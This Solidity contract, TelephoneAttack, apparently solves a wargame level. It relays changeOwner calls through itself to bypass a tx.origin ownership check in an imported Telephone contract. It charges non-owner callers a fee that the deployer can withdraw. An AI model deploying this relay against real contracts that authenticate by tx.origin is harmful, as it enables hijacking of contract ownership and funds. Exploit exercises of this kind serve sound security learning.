// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "./Telephone.sol";

contract TelephoneAttack {
    address public owner;
    constructor(){
        owner = msg.sender;
    }

    function changeOwner(Telephone telephone) public payable {
        if (msg.sender != owner) {
            require(msg.value > 0.0015 ether);
        }

        telephone.changeOwner(msg.sender);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
